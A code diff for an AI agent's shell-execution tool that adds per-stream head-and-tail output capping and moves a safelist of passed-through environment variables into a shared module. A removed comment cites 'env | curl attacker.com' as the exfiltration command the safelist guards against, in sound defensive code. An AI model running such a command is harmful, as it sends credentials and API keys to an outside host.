@@ -9,7 +9,6 @@ from __future__ import annotations
 
 import asyncio
 import contextlib
-import os
 from pathlib import Path
 from typing import ClassVar, Literal
 
@@ -20,7 +19,11 @@ from primer.model.chat import ToolExample
 from primer.model.except_ import BadRequestError, NotFoundError
 from primer.workspace._locks import WorkspaceLockTable
 from primer.workspace.tool import ToolCallContext, ToolResult, WorkspaceTool
-from primer.workspace.local.tools._common import resolve_workspace_path
+from primer.workspace.local.tools._common import (
+    TOOL_RESULT_CAP_BYTES,
+    _curated_subprocess_env,
+    resolve_workspace_path,
+)
 
 
 _DEFAULT_TIMEOUT_MS = 120_000
@@ -88,16 +91,20 @@ class ExecArgs(BaseModel):
 class Exec(WorkspaceTool):
     """Run a shell command.
 
-    Foreground output: ``<exit code>\\n<stdout>\\n<stderr>``. Subject to
-    the workspace's outer truncation policy via the runtime.
+    Foreground output: ``<exit code>\\n<stdout>\\n<stderr>``. Each stream
+    is capped at its head (``_HEAD_BYTES``) plus its tail (``_TAIL_BYTES``)
+    with a ``[... N bytes omitted ...]`` marker between, and the tool sets
+    :attr:`ToolResult.truncated` whenever bytes were omitted so the
+    runtime skips its outer truncation instead of double-cutting.
 
-    On timeout: kills the process, raises :class:`BadRequestError`.
+    On timeout: kills the process group, raises :class:`BadRequestError`.
 
     Background mode is not yet implemented (per spec: "a separate
     ``exec_status(pid)`` companion -- TBD in implementation"). Today
     it raises :class:`BadRequestError`.
     """
 
+    self_bounded: ClassVar[bool] = True
     id: ClassVar[str] = "exec"
     description: ClassVar[str] = (
         "Run a shell command in the workspace. Returns "
@@ -220,8 +227,8 @@ class Exec(WorkspaceTool):
             )
             finished = False
             try:
-                stdout, stderr = await asyncio.wait_for(
-                    proc.communicate(),
+                stdout, stderr, dropped = await asyncio.wait_for(
+                    _communicate_capped(proc),
                     timeout=args.timeout_ms / 1000.0,
                 )
                 finished = True
@@ -240,10 +247,18 @@ class Exec(WorkspaceTool):
         out_text = stdout.decode("utf-8", errors="replace")
         err_text = stderr.decode("utf-8", errors="replace")
         body = f"{rc}\n{out_text}\n{err_text}"
+        if dropped:
+            body += (
+                f"\n[output truncated: {dropped} bytes were omitted "
+                "from the streams above]"
+            )
         if args.check and rc != 0:
             raise BadRequestError(nonzero_exit_message(args.command, rc, out_text, err_text))
+        # truncated=True tells the runtime the tool already bounded its
+        # output, so it must not apply the outer 50 KiB truncation on top.
         return ToolResult(
             output=body,
+            truncated=dropped > 0,
             metadata={
                 "exit_code": rc,
                 "command": args.command,
@@ -257,45 +272,91 @@ class Exec(WorkspaceTool):
 # ===========================================================================
 
 
-# Variables we copy from the parent process when constructing the
-# subprocess environment. Anything outside this set (notably API keys,
-# DB credentials, and other application secrets) is dropped so an LLM
-# command like ``env | curl attacker.com`` cannot exfiltrate them.
-_ENV_PASSTHROUGH = frozenset({
-    "PATH",
-    "HOME",
-    "USER",
-    "USERNAME",
-    "LANG",
-    "LC_ALL",
-    "LC_CTYPE",
-    "TZ",
-    "TMPDIR",
-    "TEMP",
-    "TMP",
-    "PWD",
-    "SHELL",
-    "TERM",
-    # Windows-specific essentials.
-    "SystemRoot",
-    "SYSTEMROOT",
-    "ComSpec",
-    "COMSPEC",
-    "PATHEXT",
-    "WINDIR",
-    "USERPROFILE",
-    "APPDATA",
-    "LOCALAPPDATA",
-    "PROGRAMDATA",
-    "PROGRAMFILES",
-    "ProgramFiles",
-    "ProgramFiles(x86)",
-})
+_CHUNK = 64 * 1024
+
+#: Per-stream retention for the exec cap: the first ``_HEAD_BYTES`` and
+#: the last ``_TAIL_BYTES`` of EACH stream (head + tail =
+#: ``TOOL_RESULT_CAP_BYTES``), so one stream's full budget cannot starve
+#: the other: the tail of a failing build's stderr survives whatever
+#: stdout printed.
+_HEAD_BYTES = 40 * 1024
+_TAIL_BYTES = TOOL_RESULT_CAP_BYTES - _HEAD_BYTES
 
 
-def _curated_subprocess_env() -> dict[str, str]:
-    """Copy only the safelisted variables from the parent environment."""
-    return {k: v for k, v in os.environ.items() if k in _ENV_PASSTHROUGH}
+def _assemble_stream(head: bytes, tail: bytes, dropped: int) -> bytes:
+    """Head + omitted-marker + tail for one stream; the plain stream when
+    nothing was dropped."""
+    if dropped == 0:
+        # The whole stream fit its head + tail budgets: head holds the
+        # first bytes, tail the rest (empty for a head-sized stream), so
+        # both are part of the kept output.
+        return head + tail
+    return (
+        head
+        + b"\n[... "
+        + str(dropped).encode("ascii")
+        + b" bytes omitted ...]\n"
+        + tail
+    )
+
+
+async def _communicate_capped(
+    proc: asyncio.subprocess.Process,
+) -> tuple[bytes, bytes, int]:
+    """Drain both pipes to EOF, keeping per stream at most ``_HEAD_BYTES``
+    (its head) and ``_TAIL_BYTES`` (its tail).
+
+    An unbounded ``proc.communicate()`` would hold a printing command's
+    WHOLE output (a ``cat`` of a multi-gigabyte log, a printing loop) in
+    the API/worker process. A pipe has no RLIMIT_FSIZE, so both streams
+    must still be drained to EOF after their budgets are spent -- or the
+    child blocks on a full pipe and only the timeout ends it -- and the
+    excess middle is counted and discarded. A SHARED combined budget
+    would let one stream starve the other (50 KiB of stdout erasing a
+    failing stderr), so each stream keeps its own head + tail. Returns
+    ``(stdout, stderr, dropped_bytes)``; each stream already carries the
+    ``[... N bytes omitted ...]`` marker when its middle was dropped.
+    """
+
+    async def _drain(stream) -> tuple[bytes, bytes, int]:
+        head = bytearray()
+        tail = bytearray()
+        dropped = 0
+        while True:
+            chunk = await stream.read(_CHUNK)
+            if not chunk:
+                break
+            room = _HEAD_BYTES - len(head)
+            if room > 0:
+                head += chunk[:room]
+                chunk = chunk[room:]
+            if chunk:
+                # Count only the bytes actually discarded: the tail keeps
+                # its own last _TAIL_BYTES, and those are NOT dropped
+                # (counting them overstated the omission by up to the tail
+                # budget and marked a head-sized stream as truncated).
+                troom = _TAIL_BYTES - len(tail)
+                if troom < len(chunk):
+                    dropped += len(chunk) - troom
+                tail += chunk
+                del tail[:-_TAIL_BYTES]
+        return bytes(head), bytes(tail), dropped
+
+    out_task = asyncio.ensure_future(_drain(proc.stdout))
+    err_task = asyncio.ensure_future(_drain(proc.stderr))
+    try:
+        await asyncio.gather(out_task, err_task)
+        await proc.wait()
+    finally:
+        out_task.cancel()
+        err_task.cancel()
+    out_head, out_tail, out_dropped = out_task.result()
+    err_head, err_tail, err_dropped = err_task.result()
+    return (
+        _assemble_stream(out_head, out_tail, out_dropped),
+        _assemble_stream(err_head, err_tail, err_dropped),
+        out_dropped + err_dropped,
+    )
 
 
 def nonzero_exit_message(command: str, rc: int, stdout: str, stderr: str) -> str:
